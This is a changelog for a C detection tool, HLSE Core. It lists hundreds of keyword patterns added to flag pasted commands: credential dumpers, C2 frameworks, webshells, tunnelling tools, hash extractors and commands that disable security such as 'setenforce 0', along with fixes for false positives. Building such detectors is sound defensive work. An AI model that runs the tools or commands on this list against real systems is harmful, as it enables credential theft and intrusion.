# Changelog

All notable changes to HLSE Core (C reference) follow [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).

## [Unreleased]

### Added (cycle-260)
- `hlse_supply.c` paste-detection: ~85 needles covering web3/blockchain
  CLIs (cast send|call|wallet, forge script|create|test, anvil, hardhat,
  brownie, truffle, ganache, mythril, slither, echidna, clef, bootnode,
  abigen, solc, vyper, scarb, cairo-run, starknet, aptos, sui, solana,
  anchor, near-cli, polkadot, wasm-pack, parity-bridges, ipfs-cluster-ctl,
  btfs, filecoin, lotus, oasis, safecmd, monero-cli, evm — real names
  flag-gated), memory dumpers & credential viewers (safetykatz, dumpert,
  wmdump, credwmap, hindsight, dumpzilla, powerram, memfetch, dumpit,
  defenderatp, firepwd, firefox_decrypt, chromepass, browserpassview,
  webbrowserpassview, keepassx, credman, regripper, jwt_tool, getnthash,
  kirbi2john), Windows token/privesc loaders (incognito, tokenvator,
  runascs, delegateexec, ppldump, blockdlls, srdi, frozen), AD/Kerberos
  aux (certi.py, soaphound, bloodyad, gmsadumper, tgsrepcrack, aspxspy,
  wmi.py), obfuscators + wordlist generators (invoke-obfuscation,
  dyscoblue, confuserex, crunch, statsprocessor, maskprocessor, cewl),
  and VM/emulation primitives (vmrun, qemu-img, qemu-system, kvm,
  virtiofsd, multipass, podman machine, hivexsh, hivexregedit, supermin,
  lima) — ALERT [45].

### Fixed (cycle-260)
- Real-word FP prevention: brownie/mythril/anvil/truffle/ganache/slither/
  echidna/clef/sui/solana/anchor/lotus/oasis/hindsight/incognito/frozen/
  crunch/kvm/lima/mdr flag-gated; cast verb-gated with `!broadcast`/
  `!podcast`; evm `!devm`; lima `!climate`/`!sublim`; sui `!pursuit`.
- Pre-existing `sod` needle FP on `episode`/`soda` closed with exclusions
  (found by cycle-260 benign sweep).

### Added (cycle-259)
- `hlse_supply.c` paste-detection: ~190 needles covering impacket leftovers
  (owneredit/ticketconverter/services/reg/sniffer/rdp_check/mssqlclient), C2
  frameworks (sliver/mythic/havoc/covenant/merlin/empire/poshc2/pupy/koadic/
  deimos), webshells (wso/b374k/chopper), container exploit kits (cdk/
  kubeletctl), exploit generators (donut/avet/bdf/cymothoa/unicorn/msfpc/
  revshells/phpsploit/beef), web recon (meg/gowitness/aquatone/eyewitness/
  wafw00f/nikto/zap/burp/tplmap/kxss/gopherus), web terminals + hosting
  panels (mosh-server/ttyd/gotty/wetty/shellinaboxd/webssh/sshwifty/cockpit/
  webmin/usermin/virtualmin/ajenti/froxlor/vesta/hestia/cyberpanel/aapanel/
  cpanel/whmapi1/uapi/plesk/directadmin/imscp/ispconfig/sentora/keyhelp/
  solusvm/virtualizor/runcloud/serverpilot/ploi/gridpanel/moss), SELinux/
  AppArmor write verbs (setenforce 0, semanage -a/-m/-d/-D, semodule
  install/remove, getsebool/setsebool flags, audit2allow, aa-complain/
  enforce/disable, apparmor_parser, tomoyo, gradm), backup exfil (restic/
  duplicity/vdump), boot-chain rewrite (mkinitramfs/update-initramfs/
  mkinitrd/update-grub/grub-install/grub2-install), bigdata (spark-submit/
  spark-shell/pyspark/hbase/cypher-shell/duckdb/hdfs dfs -put/hadoop fs -put),
  message queues (emqx ctl/eval/stop/kill, vernemq, nsq family), ~40 eBPF
  snoop tools (mountsnoop...filelife), sandboxes (runsc/gvisor/kata-runtime/
  firecracker/firectl/ignite), document converters (pandoc/unoconv/
  soffice --headless/weasyprint/prince/dompdf/enscript/a2ps/paps/cupsfilter/
  html2text/ps2pdf/pdfjam/pdftk/mutool/qpdf --decrypt|--password), print
  stack (cupsd/cupsctl --share/lpoptions/cups-browsed/foomatic), accessibility
  backdoors (sethc/utilman/osk/magnify/narrator/displayswitch/atbroker),
  Windows misc (register-cimprovider/changepk/msra -/iisreset/appcmd
  add|set|delete/msdeploy -/ngen/mscorsvw/dotnet-dump/windbg/cdb/adplus/
  dcdiag/dsacls -/csvde/ldifde/smbcontrol/smbstatus/rpcclient -), and
  libguestfs (virt-make-fs/libguestfs/iceman -) — ALERT [45].

### Fixed (cycle-259)
- Pre-existing-coverage dedup: removed new needles for gau/presto/trino/
  arangosh/clickhouse-client/beeline/pupy/fltmc/presentationhost/kd —
  already gated elsewhere in the file (suite's existing hits keep verifying).
- Benign collisions resolved via verb/flag gates: appcmd → ` add| set| delete`;
  msra/msdeploy/dsacls/rpcclient/nikto/osk/utilman/getsebool/setsebool/
  fltmc-form → ` -` flag gates; setenforce → `setenforce 0` literal;
  semanage → ` -a|-m|-d|-D`; semodule → install/remove verbs; cupsctl →
  ` --share`; emqx → ctl/eval/stop/kill/restart/reload; restic/duplicity/
  yarn → `!--version`; nsq → `!dnsquery`; runsc → `!runscript`; deimos/
  iceman/pupy-form → ` -` gates. dracut dropped (benign read-verbs dominate).

### Added (cycle-258)
- Paste-detection coverage for forensics/imaging (Sleuth Kit `fls`/`istat`/`img_stat`/`fsstat`/`srch_strings`/`hfind`/`sorter`/`jcat`, `foremost`/`scalpel`/`mac-robber`, Volatility `vol.py`/`vol3`/`memprocfs`, `pmem`/`lime`/`ramcapture`/`dumplt`/`limeaide`, `wimcapture`/`wimapply`/`wimlib`, `dism++`, `bootice`, `partclone`/`ntfsclone`/`fsarchiver`/`partimage`/`clonezilla`/`ocs-*`, `ntfscat`/`ntfsfix`/`ntfsls`/`ext3grep`, `mkntfs`/`exfatlabel`/`udfinfo`/`xorrisofs`/`genisoimage`/`isohybrid`, `rufus`/`etcher`/`rpi-imager`/`ventoy`, `reagentc` write-verbs) and forensic exporters (`readpst`/`pst2ldif`/`lspst`/`pffexport`, `evtxexport`/`regexport`/`sbag`/`amcacheparser`/`jumplist`/`lnkanalyzer`/`pf.exe`/`usnjrnl`/`msiecfexport`/`olecfexport`/`lnkexport`/`wminfo`/`pyluina`/`libesedb`/`bkhive`, clipboard `clipman`, OCR `tesseract`/`gocr`/`ocrmypdf`).
- LLM agent CLIs (`aider`/`claude-code`/`cursor-agent`/`opencode`/`codex`/`gemini`/`llxprt`, `llm`/`mods`/`fabric`/`aichat`/`tgpt`/`shell_gpt`/`sgpt`/`yai`/`plz`/`ask`/`howto`/`copilot` — real words flag-gated), IdP/secrets brokers (`oidc-agent`/`oidc-token`/`gtoken`/`jwtgen`/`jose`/`cmctl`/`dexctl`/`hydra`/`kratos`/`oathkeeper`/`authelia`/`kcadm`, `berglas`/`chamber`/`credhub`/`envchain`/`conjur`/`summon`/`secrethub`/`keywhiz`/`akeyless`/`boundary`), and fuzzers/chaos (`afl-fuzz`/`honggfuzz`/`syzkaller`/`winafl`/`boofuzz`/`zzuf`/`radamsa`/`sulley`/`domato`/`jazzer`, `litmusctl`/`chaosd`/`chaosblade`/`pumba`/`kraken`).
- Data/ML platform CLIs (`airbyte`/`singer`/`meltano`/`dlt`, CDC `debezium`/`maxwell`/`canal`, `beam`, orchestrators `airflow`/`prefect`/`dagster`/`luigi`, `dbt`/`metabase`/`superset`, `mlflow`/`dvc`/`kubeflow`/`clearml`/`wandb`/`sagemaker`), IoT/edge (`aziotctl`/`iotedge`/`greengrass`/`particle`/`balena`), gaming/streaming (`steamcmd`/`lutris`/`protontricks`/`winetricks`/`dosbox`/`virt-viewer`/`weylus`/`sunshine`/`moonlight`/`parsec`/`dayon`), KVM-over-IP & homelab (`meshcmd`/`kvmd`/`pikvm`/`tinypilot`/`jetkvm`, `runtipi`/`umbrel`/`casaos`/`yunohost`/`sandstorm`/`freedombox`/`homelabos`, `dockge`/`portainer`/`yacht`/`komodo`/`dozzle`/`lazydocker`).
- k8s dashboards & observability (`lens`/`headlamp`/`octant`/`kubedashboard`/`weave-scope`, `grafana`/`alloy`/`promtail`/`mimir`/`loki`/`tempo`/`pyroscope`/`faro`), service mesh (`kuma`/`kumactl`/`osm`/`glooctl`/`edgectl`/`contour`/`emissary`/`solo-io`), admission/supply (`spire-agent`/`spiffe`/`in-toto`/`witness`/`vexctl`/`bom`/`kritis`/`kyverno`/`gatekeeper`/`falcoctl`/`tetragon`/`pwru`/`inspektor`/`kubeshark`/`kubepug`/`pluto`/`nova`/`popeye`/`krr`/`robusta`/`holmesgpt`/`kagent`/`kmctl`/`kgctl`).
- Git forges & aux (`gitea`/`gitbucket`/`gitlab-ctl`/`bucket4j`, `arc`/`arcanist`/`phab`, `repo init|sync|upload`, `git-review`/`git-imerge`/`git-absorb`/`git-revise`/`ghq`/`hub`/`laconic`/`git-lfs`/`dolt`/`lakefs`/`xet`), coord/config (`zookeeper`/`etcdkeeper`/`consul-template`/`vaulted`/`approle`/`pomerium`/`oauth2-proxy`/`dex`/`teleport`/`tsh`/`tctl`/`tbot`/`boundary-worker`/`openbao`/`bao`/`doppler`), and authz policy (`openfga`/`fga`/`topaz`/`aserto`/`permit`/`oso`/`cedar`/`xacml`/`sentinel`/`regal`/`polaris`).
- k8s distros/provisioners (`kubescape`/`kube-score`/`kube-linter`/`kubeval`/`kubeaudit`/`kubesec`/`kubereport`/`kuttl`, `chaos`, `k0sctl`/`rke2`/`microk8s`/`k3d`/`vcluster`/`loft`/`capsule`/`kamaji`/`hyperv`/`okd`/`crc`/`minishift`/`rosa`/`aro`, `eksctl`/`aks-engine`/`clusterawsadm`/`clusterctl`/`kops`/`kubespray`/`kubeasz`/`kubeadm`/`kubekey`/`kk`/`sealos`/`rancherd`/`fleet`/`elemental`/`harvester`/`epinio`/`waypoint`/`nocalhost`/`garden`/`okteto`/`bridge-to-kubernetes`).
- IaC/config-lang/config-mgmt (`tanka`/`jsonnet`/`cue`/`dhall`/`hcl`/`starlark`/`tilt`/`sko`, `chainguard`/`melange`/`apko`/`wolfictl`/`undock`/`image-spec`/`regclient`/`regbot`/`regsync`, `cinc`/`inspec`/`chef-apply`/`test-kitchen`/`kitchen`/`molecule`/`goss`/`gossa`/`serverspec`, `ansible-vault`/`ansible-pull`/`ansible-galaxy`, `salt-call`/`salt-key`/`salt-run`/`salt-cloud`, `cfengine`/`cf-agent`/`cf-key`/`bcfg2`, `puppet resource|apply|run`/`bolt`/`r10k`/`facter`/`hiera`/`eyaml`, `terragrunt`/`tfenv`/`tfswitch`/`tofu`/`openbao`/`valut`/`runecast`/`env0`/`spacelift`/`env0ctl`/`brainboard`/`inframap`/`terraformer`/`tf2pulumi`/`former2`/`aztfexport`/`terraforming`/`terracognita`).

### Fixed (cycle-258)
- Substring collisions & preexisting-benign conflicts: `tsh`/`tctl`/`ils`/`ak -` dropped (collide with `netsh`/`auditctl`/`bootctl`/`certbot`/`tshark`/`interactsh`/`rails`/`tailscale`/`flatpak --version`); `tbot` guards `certbot`; `hcl` excludes `dhclient`/`hcloud`; `ask`/`kk` exclude `taskkill`/`taskset`; `inspec` excludes `pythoninspect`; `dex` excludes `index`; `gocr`/`hydra`/`chamber`/`summon`/`witness`/`moonlight`/`sunshine`/`parsec`/`nova`/`bolt`/`popeye`/`robusta`/`tanka`/`alloy`/`tempo`/`contour`/`gatekeeper`/`tetragon`/`octant`/`faro`/`mimir`/`loki`/`kuma`/`arcanist`/`goss`/`llm`/`airflow`/`k3d`/`kubeadm`/`salt-key` flag/verb-gated; `reagentc` gated to write-verbs (`/set|/disable|/boottarge`).
- Redundant needles removed where pre-existing coverage already applies (airflow/kubeadm/salt-key/ansible-pull/tune2fs/parsec/moonlight/sunshine/nova/bolt/hydra/chamber/summon/k3d).

### Added (cycle-257)
- Paste-detection coverage for enterprise app servers (WebSphere `wsadmin`/`startServer`/`stopServer`, WebLogic `wlst`/`startWebLogic`/`nmEnroll`/`nmKill`/`nmExecCmd`, `jboss-cli`/`asadmin`/`imqcmd`, `catalina`, `tcruntime-ctl`, OPMN `opmnctl`/`dcmctl`/`oidctl`/`bulkload`/`bulkmodify`/`bulkdelete`/`dipassistant`, `pkispawn`/`pkidestroy`, FreeIPA `ipa-server-install`/`ipa-replica-*`/`ipactl`) and enterprise DB suites (SAP HANA `hdbsql`/`hdbcons`/`hdblcm`/`hdbuserstore`, SAP `sapcontrol`/`saprouter`/`r3trans`/`r3load`, Informix `oninit`/`onmode`/`ontape`/`dbaccess`/`dbexport`, Teradata `bteq`/`fastload`/`fastexport`/`multiload`/`tpump`/`vprocmanager`, Netezza `nzsql`/`nzload`/`nzbackup`/`nzrestore`, Greenplum `gpfdist`/`gpload`/`gpstart`/`gpstop`/`gpbackup`/`gprestore`/`gpssh`/`gpcopy`, Vertica `vsql`/`admintools`, MonetDB `mclient`/`monetdbd`, Firebird `fbsql`/`gbak`/`gfix`/`gsec`/`nbackup`/`fbtracemgr`, Progress `prodb`/`proutil`/`proshut`/`probkup`/`prorest`, FileMaker `fmsadmin`/`fmserverd`, FreeTDS `isql`/`tsql`/`bsqldb`/`freebcp`/`defncopy`/`datacopy`, `ddbsh`).
- Cloud/IaC CLIs (`ibmcloud`/`linode-cli`/`vultr-cli`/`exo`, `cloudmonkey`/`cmk`/`euca-*`, Nutanix `ncli`/`acli`, `dapr`, `faas-cli`/`fission`/`nuctl`/`wsk`, `supabase`/`pscale`/`neonctl`/`turso`, `flyway`/`liquibase`/`atlasgo`/`gh-ost`/`alembic`/`prisma`, `n98-magerun`/`shopify`).
- Monitoring/observability (`kapacitor`, `nrpe`/`check_nrpe`, `centcore`/`centengine`, `gmond`/`gmetad`/`gmetric`, `rrdcached`, `munin-*`, `carbon-cache`/`whisper-*`, `vmagent`/`vmalert`/`vmbackup`, `thanos`/`cortex`, `logcli`/`promtool`, `pmacct`/`nfacctd`/`sfacctd`, `nfdump`/`nfcapd`/`silk`/`yaf`/`softflowd`, `agent_control`/`fleetctl`/`velociraptor`/`oscap`/`autotailor`) and AV/EDR vendor CLIs (`mpcmdrun`/`repcli`/`reputil`/`cbdaemon`/`parity`/`kesl-control`/`klnagent`/`esets_*`/`savdctl`/`sweep`/`maconfig`/`msainfo`/`uvscan`/`cmdscan`/`mfemactl`/`bdscan`/`bdcheck`/`sigtool`/`a2cmd`/`fsav`/`avscan`/`avconfig`/`pavsig`/`psanhost`/`sbamscan`/`wrsa`/`cylancesvc`/`cyoptics`/`xagt`/`feagent`/`hxagent`/`hurukai`/`taniumclient`).
- Network-appliance CLIs (CheckPoint `fw ctl`/`fwm`/`cpconfig`/`cphaprob`/`cpwd`/`cpinfo`, Palo Alto `pan_comm`/`panxapi`, Fortinet `fcconfig`/`fnsysctl`/`fnbamd`, Barracuda `phionctrl`/`acpf`/`cgtool`/`ngfirewall`/`ngadmin`, UTM `confd`/`awed`/`midd`, MikroTik `routeros`/`capsman`/`userman`, Ubiquiti/VyOS `unms`/`ucrm`/`edgeos`/`vyatta`/`vyos`/`vbash`, F5 `bigpipe`/`icontrol`/`tmctl`/`bigstart`/`mcpd`/`restjavad`/`sod`/`tmm`, NetScaler `nscli`/`nsconmsg`/`nstrace`/`nstcpdump`/`nssavecore`/`nsstats`/`nswfs`/`nswl`/`aaad`, Juniper `mgd`/`jsnap`/`jnpr`/`contrail`/`mist`, Aruba `airwave`/`clearpass`/`cppm`, Cisco `vsh`/`dcnm`/`ncs_cli`/`apic`).
- Out-of-band BMC/storage (Supermicro `sum`/`onecli`, Lenovo `xclarity`, Oracle ILOM `ilomconfig`/`itpconfig`/`hwmgmtcli`/`ubiosconfig`/`biosconfig`, HP `conrep`/`ssaducli`, Dell `omconfig`/`omreport`/`srvadmin`/`idracadm`/`racadm`/`dsu`, HDS `horcm`/`raidcom`/`pairsplit`/`paircreate`, EMC `naviseccli`/`powermt`/`emcpadm`, `3paradm`, Pure `pureadmin`/`purevol`, Isilon `isi`, NetApp `vserver`/`ontapcli`, ASUS `asmb`/`aswm`/`asmc`) and backup vendors (`dsmc`/`dsmcad`/`bpbackup`/`bprestore`/`bplist`/`simpana`/`qoperation`/`qcommand`/`cvcl`/`veeamconfig`/`acrocmd`/`duply`/`borgmatic`/`backuppc_*`/`b2-linux`/`crashplan`/`code42`/`ditto`).
- Covert-channel proxies/tunnels (`revsocks`/`stowaway`/`xray`/`clash`/`hysteria`/`brook`/`ipt2socks`/`trojan-go`/`inlets`/`interactsh-*`/`meek`/`snowflake`/`webtunnel`/`onionshare`/`onionbalance`), SIP/VoIP (`sipsak`/`svreport`/`svcrash`/`pjsystest`/`opensipsctl`/`osipsconsole`/`fs_ctl`/`fsctl`/`gnugk`/`ohphone`/`simph323`), packaging/exec runtimes (`amm`/`coursier`/`ros`/`gambit`/`nuitka`/`pyinstaller`/`cx_freeze`/`pex`/`shiv`/`pyoxidizer`/`cython`/`wasmtime`/`wasmer`/`wasmedge`/`iwasm`/`spin`/`native-image`/`gu`/`zmodload`), shell/plugin managers (`basher`/`zinit`/`sheldon`/`fisher`/`mise`/`asdf`/`rtx`/`proto`/`aqua`/`ubi`/`eget`/`topgrade`/`lefthook`/`husky`/`lint-staged`/`overcommit`), chat infra (`mmctl`/`zulip-send`/`murmurd`/`ts3server`/`tsdns`/`matterbridge`), X/surveillance (`xmodmap`/`xkbcomp`/`xset`/`xwud`/`jackrec`/`maim`/`grim`/`v4l2-ctl`/`motion`/`lkl`/`uberkey`), and DHCP (`kea-*`/`keactrl`/`kea-shell`/`kea-dhcp-ddns`/`kea-netconf`/`dhcpd`/`dhcptest`/`dhcpdump`/`dhcpstarv`/`dhcpig`/`dibbler-*`).

### Fixed (cycle-257)
- Substring-boundary collisions: `dude` excluded `avrdude`, `nscli` excluded `dnsclient`, `gu` excluded `pkgutil`, `sod` excluded `sodium`, `nsstats` excluded `dnsstats`, `amm` flag-gated (`gamma`), `ros`/`mise`/`proto`/`eget`/`ubi`/`rtx` flag-gated (`pros`/`promise`/`protocol`/`beget`/`cubi`), `asi`/`isu` not emitted.
- Pre-existing-benign conflicts resolved by flag/verb gating: `promtool` (`promtool check rules` stays clean), `v4l2-ctl` (`--list-devices` stays clean, `--set`/`--stream`/`-d` fire), `racadm`/`omconfig`/`stowaway`/`xray`/`motion` gated on ` -` (`racadm`, `omconfig system summary`, `stowaway story`, `xray --version`, `motion -h`/`--help` stay clean); `enable -f` dropped (pre-existing benign `enable -f x`).

### Added (cycle-256)
- Paste-detection coverage for HPC/cluster schedulers (Slurm `srun`/`sbatch`/`salloc`/`scancel`/`squeue`/`sacct`/`scontrol`/`sreport`/`sdiag`, PBS `qsub`/`qdel`/`qstat`/`qalter`/`qmgr`/`pbs_*`/`tracejob`, LSF `bsub`/`bjobs`/`bkill`/`bqueues`/`bhosts`/`badmin`/`brun`/`lsload`/`lshosts`/`lsid`/`lsinfo`, HTCondor `condor_*`, MPI `mpiexec`/`mpirun`/`orterun`/`orted`/`ompi-*`/`oshrun`/`mpicc`/`mpicxx`/`mpif*`, xCAT `xcat`/`rpower`/`xdsh`/`nodeset`/`genimage`/`makedhcp`, cluster shells `genders`/`nodeattr`/`cluset`/`powerman`/`rconsole`/`conserver`/`conman`).
- Privilege-escalation enumerator names (`sudokiller`/`suid3num`/`winpwn`/`privesccheck`/`linpeas`/`winpeas`/`linenum`/`traitor`/`powerup`/`watson`/`seatbelt`/`jaws` — real words flag-gated), steganography suite (`steghide`/`stegsnow`/`outguess`/`openstego`/`stegosuite`/`zsteg`/`jphide`/`jsteg`/`snow -`/`f5 -e`), secure-deletion/anti-forensic (`sfill`/`sswap`/`sdmem`/`nwipe`/`bcwipe`/`dcfldd`/`dc3dd`/`guymager`/`srm -`), DoS tooling (`slowloris`/`torshammer`/`slowhttptest`/`pyloris`/`ufonet`/`ddosim`/`trinoo`/`stacheldraht`/`goldeneye -`/`hulk -`/`loic -`/`hoic -`/`xoic -`/`mgen`/`nepim`/`udpgen`/`bittwist`/`fragroute`), web terminals and LLM serving (`code-server`/`openvscode`/`ollama`/`vllm`/`localai`/`llamafile`/`lmdeploy`/`sglang`).
- Password-manager and hash-extraction surface (`pass` verb gate, `gopass`/`kpcli`/`keepassxc-*`/`kwallet*`/`secret-tool`, `unshadow` and the `*2john` family `zip2john`/`rar2john`/`pdf2john`/`ssh2john`/`gpg2john`/`krb2john`/`keepass2john`/`mozilla2john`/`hccap2john`/`luks2john`/`office2john`/`putty2john`/`racf2john`/`bitcoin2john`/`dmg2john`/`keychain2john`/`keyring2john`/`kwallet2john`/`wpapcap2john`/`1pass2john`/`truecrypt_volume2john`/`sipdump2john`), wireless/SDR (`wash -i`/`bully -`/`pixiewps`/`mdk3`/`mdk4`/`smqueue`/`openbts`/`osmo-*`/`srsue`/`srsenb`/`srsepc`/`srsnb`/`srsdu`/`srsgnb`/`srscu`/`open5gs`/`bladerf`/`uhd_*`/`limeutil`/`gqrx`/`gnuradio`/`volk_*`/`yate -`/`transceiver -`).
- DNS server/admin surface (`named` gate + `named-check*`/`named-compilezone`/`named-journalprint`/`named-rrchecker`, `nsd-control`/`nsd-check`/`nsdc`, `pdnsutil`/`rec_control`, `knotd`/`knotc`/`kzonecheck`, `dnssec-*`/`tsig-keygen`/`ddns-confgen`, djbdns `dnscache`/`tinydns`/`axfr-get`/`pickdns`/`walldns`/`rbldns`/`axfrdns`/`dnsfilter`/`dnsip`/`dnsmx`/`dnsq`/`dnstrace`/`dnstxt`, `cli53`/`inadyn`/`ddclient`/`ez-ipupdate`/`dnscontrol`/`octodns`/`maradns`/`deadwood`/`zoneserver`/`askmara`/`duende`/`fetchzone`/`dnsviz`/`dnstop`/`dnsbulk`/`calidns`/`dnsscope`/`dnswasher`/`nsec3dig`/`sdig`/`stubquery`/`zone2*`).
- IRC/XMPP daemons and services (`ircd`/`ngircd`/`inspircd`/`unrealircd`/`ircu`/`charybdis`/`solanum`/`snircd`/`ergo -`/`oragono`/`bitlbee`/`anope`/`atheme`/`nickserv`/`chanserv`/`operserv`/`hostserv`/`memoserv`/`botserv`/`eggdrop`/`limnoria`/`supybot`/`sopel`/`errbot`/`hubbot`/`znc`/`thelounge`/`kiwiirc`/`convos`/`soju`/`ejabberdctl`/`prosodyctl`/`mongooseim`/`mongooseimctl`/`jabberd`/`xmppd`), TURN/STUN (`turnserver`/`turnadmin`/`turnutils_*`/`stund`/`stunclient`/`stuntman`/`resiprocate`/`coturn`/`repro -`).
- Mail-stack surface (OpenSMTPD `smtpctl`, `msmtp`/`msmtpd`, `getmail`/`fetchmail`, `procmail`/`formail`/`maildrop`/`deliverquota`/`reformail`/`reformime`/`makemime`/`mailbot`, Sieve `sievec`/`sieved`/`sieve-test`/`sieve-filter`/`managesieve`/`pysieved`, readers `himalaya`/`aerc`/`meli`, MH suite `mailutil`/`tmail`/`dmail`/`ipop*d`/`slocal`/`rcv*`/`packf`/`install-mh`/`msgchk`/`mh*`/`mmh`/`mhl`/`msh`, `nullmailer`/`ssmtp`/`esmtp`/`fdm`, Courier `courier*`/`auth*`/`makeuserdb`/`userdb*`, greylist/SPF/DKIM `greylistd`/`postgrey`/`policyd`/`sqlgrey`/`milter-greylist`/`tumgreyspf`/`opendkim`/`opendmarc`/`arcsign`/`arcverify`/`dkimproxy`/`dkimsign`/`spfd`/`spfquery`/`spfmilter`, `dspam`/`razor-*`/`dcc*`/`crm114`/`css*`, Mailman `mailmanctl`/`mailman -`/`newlist`/`rmlist`/`add_members`/`remove_members`/`sync_members`/`find_member`/`list_members`/`list_lists`/`list_owners`/`config_list`/`withlist`/`mmsitepass`, `sympa`/`ezmlm`/`majordomo`, Cyrus `cyradm`/`ctl_*`/`cyr_*`/`cyrdeliver`/`ipurge`/`mb*`/`ptdump`/`ptexpire`/`squatter -`/`timsieved`/`tls_prune`/`unexpunge`/`cvt_cyrusdb`/`mkimap`/`lmtpd`/`mupdate`/`notifyd`).
- Smartcard/HSM/TPM surface (`pcscd`/`pcsc_scan`/`pcsctest`/`opensc`/`pkcs11`/`pkcs15`/`piv -`/`openpgp`/`pn53x`/`acr122`, YubiKey `ykinfo`/`ykclient`/`ykpam`/`yubioath`/`yubipiv`/`yubitotp`/`yubitoken`/`ykcs11`/`nitropy`, `solo*`/`ledger*`/`trezor*`/`ckcc`, HSM `softhsm`/`yubihsm`/`nethsm`/`nfkm`/`lunacm`/`lunash`/`ctconf`/`ckdemo`/`cloudhsm`/`key_mgmt_util`/`keylime_*`/`swtpm`/`evmctl`).
- Domain-join/AD-aux surface (`adcli -`/`realmd`/`msktutil`/`adclient`/`adjoin -`/`adleave`/`adflush`/`adpasswd`/`adquery`/`dzdo`/`dzsh`/`dzjoin`/`pbis`/`lwconfig`/`lwsm`/`lsassd`/`domainjoin`/`vastool`/`vasd`/`realm join`/`net ads join`/`net rpc join`/`sss_useradd`/`sss_userdel`/`sss_usermod`/`sss_obfuscate`/`sss_seed`/`sss_override`/`sss_debuglevel`), macOS admin additions (`dseditgroup` write-verb gate, `dsenableroot`, `dscacheutil -f`, `bless -`, `lipo -`, `socketfilterfw`, `scutil --set`, `santactl`, `mdatp`, `falconctl`, `sentinelctl`, `munkiimport`), SELinux `restorecon`/`runcon`.
- TeX/typesetting execution surface (`latex` `.tex| -` gate, `pdflatex`/`xelatex`/`lualatex`/`texlua`/`texluac`/`latexmk`/`arara`/`tlmgr`/`fmtutil`/`updmap`/`mktexlsr`/`texconfig`/`texmfstart`/`mtxrun`/`contextjit`/`texexec`/`gnuplot`/`mmdc`/`plantuml`/`asy -`).

### Fixed (cycle-256)
- Substring-boundary collisions: `orted` excluded `sorted`, `bmod` excluded `submodule`, `badmin` excluded `wbadmin`, `dmail` excluded `sendmail`, `meli` excluded `timeline`, `newlist` excluded `newlisten*`, `rmlist` excluded `termlist`, `dnsq` excluded `dnsquery`, `runcon` excluded `runcontext`, `restorecon` excluded `restoreconfig`, `linenum` excluded `linenumber*` (also patched a second pre-existing bare `linenum` site), `linenumber` guard for `linenum`; `sinfo`/`sreport`/`brun`/`lsid`/`genders`/`conman`/`stuntman`/`mailman`/`squatter`/`adcli`/`dseditgroup` moved to verb/flag gates to preserve pre-existing benign expectations (`dseditgroup -o read`, `wbadmin start`, `sendmail` forms, `verclsid`, `fsutil fsinfo`, `git submodule status`, `fossil timeline`, `adcli info`, `cat named.conf`, `circuit` prose via removed `ircu`/`named.conf` needles).
- Stripped ~450 designed-hit benign expectations across the new invented-tool-name surfaces (docs-mention firing is intentional, mimikatz-style) and dropped wrongly-benign forms `pass show/-c`, `fetchmail --version`, `bless --info`, `znc`, `wash -i clothes`, `powerup/powerup mushroom` splits resolved by gate choice.

### Added (cycle-255)

- **Paste-detector breadth — git config exec sinks, file watchers, JS/deno/bun
  runtimes, Secure Boot/MOK ops, snapshot/volume ops, UAC-bypass leftovers,
  tape/audit/ELF misc** (`hlse_supply.c`): git exec sinks
  (`core.sshcommand`, `core.fsmonitor`, `gpg.program`, `diff.external`,
  `difffilter`, `insteadof` URL rewrite, `sendemail.smtp`, `merge.*.driver`,
  `filter.*.clean`/`smudge`/`required`, `git daemon`, `instaweb`,
  `bisect run`/`exec`, `remote-hg`, `remote-bzr`, `git svn`, `svnserve`,
  `svnsync`, `hg serve`); file-watch exec (`watchman` watch/trigger/--
  gates, `nodemon` -/--/.js gates, `chokidar`, `cargo-watch`, `entr`,
  `reflex`, `air`, `gaze`); runtimes (`node` --eval/--inspect/-p/
  --experimental gates, `deno` eval/install/task/compile/run-allow gates,
  `bun` .js/.ts/-e gates, `pear` install/channel); firmware/keys
  (`impdp`, `mokutil` --disable/--import/--delete/--reset/--mokx/--timeout,
  `efi-updatevar`, `ykpersonalize`, `nitrocli`, `onlykey-cli`, `claymore`
  -e/miner gates, `btrfs` resiz/defr/balance/device/scrub gates);
  Windows (`winrs` - gate, `colorcpl`, `optionalfeatures`, `syssetup`,
  `dcomcnfg`, `mmc` .msc); misc (`strip`/`pmap` flag gates, `mt -f`
  erase/retens, `mtx`, `dump`/`restore` gates, `amdump`, `amrestore`,
  `amadmin`, `amtape`, `auditctl` -r/-e-0).

### Fixed (cycle-255)

- `watchman` ` watch`→` watch ` boundary (the watchman duty FP);
  `nodemon`/`gaze`/`watchman` `--version`/`--help` guards;
  `mmc`→`.msc`, `mt -f`→erase/retens, `mokutil`→destructive-verb,
  `btrfs`→write-verb, `auditctl`→`-r`/`-e 0`, `winrs`→flag-gate —
  read-only forms stay clean; `ausearch`/`aureport` needles dropped
  (pre-existing coverage).

### Added (cycle-254)

- **Paste-detector breadth — RMM remotes, policy/Kerberos ops, netrecon,
  firmware/GPIO, carvel/CDK/firebase, subdomain-takeover, MITM, exploit tools**
  (`hlse_supply.c`): RMM/remotes (invented names bare: `dwagsvc`,
  `meshcentral`, `meshagent`, `level.io`, `radmin`, `intelliadmin`,
  `remcom`, `winexesvc`, `zohoassist`, `winvnc`, `tvnserver`,
  `vncviewer`, `tightvnc`, `ultravnc`, `realvnc`, `anyvnc`; gated
  `parsec`, `vnc` flag/`:` forms); Windows session/policy (`tscon`,
  `quser`, `qprocess`, `query session`/`query user`, `shadow` /dest|-/
  gates, `msg` *//server//v, `change logon`, `chglogon`, `chgusr`,
  `wevtutil epl`/export, `powercfg` /h//waketimers/- gates,
  `netstat -b`/`-f`, `netsh wlan` export/add/delete/set/hostednetwork,
  `netsh winhttp`, `secedit`, `auditpol` already covered, `ksetup` —
  `!networksetup` guarded, `ktpass`, `setspn`, `dsget`, `dsmove`,
  `ldp.exe`, `vaultcmd`, `rasautou`, `tracelog`, `typeperf` -// gates,
  `attrib ` flag gates, `compact` /c//u//i, `format` c://q//fs//v,
  `mountvol` /d//r/-, `chkdsk` //-/c:/d:); Unix accounts/hardware
  (`pwconv`, `grpconv`, `chage`, `lastlog`, `hostnamectl`, `domainname`,
  `ypdomainname`, `nisdomainname`, `netcap`, `audicap`, `setcap` cap/-
  gates, `logger` - gates, `kpartx`, `partprobe`, `proot` -//root/./-b
  gates, `fakechroot`, `fakeroot`, `efibootmgr`, `efivar`, `fwupdmgr`,
  `fwupdtool`, `kernel-install`, `devmem`, `devmem2`, `memtool`,
  `i2cget`, `i2cdetect`, `i2cdump`, `gpiodetect`, `gpioinfo`, `gpioget`,
